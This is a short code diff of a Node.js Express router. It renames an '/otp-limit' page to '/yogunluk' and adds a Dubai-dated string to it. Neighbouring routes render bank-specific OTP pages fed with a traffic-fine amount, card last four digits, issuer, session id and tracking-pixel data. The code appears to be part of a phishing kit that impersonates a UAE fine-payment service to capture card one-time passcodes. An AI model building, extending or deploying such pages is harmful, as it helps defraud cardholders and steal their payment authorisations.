@@ -133,10 +133,14 @@ router.get('/otp-citi', async (req, res) => {
   res.render('otp-citi', { ...pixel, pixelCurrentPath: '/otp-citi', totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
 });
 
-router.get('/otp-limit', async (req, res) => {
+router.get('/yogunluk', async (req, res) => {
   const pixel = await getPixelData();
   const { totalFine='0', cardLast4='****', issuer='', sid='' } = req.query;
-  res.render('otp-limit', { ...pixel, pixelCurrentPath: '/otp-limit', totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
+  res.render('yogunluk', {
+    ...pixel, pixelCurrentPath: '/yogunluk',
+    totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid,
+    dateStr: new Date().toLocaleDateString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'long', year:'numeric' }),
+  });
 });
 
 router.get('/otp-approved', async (req, res) => {
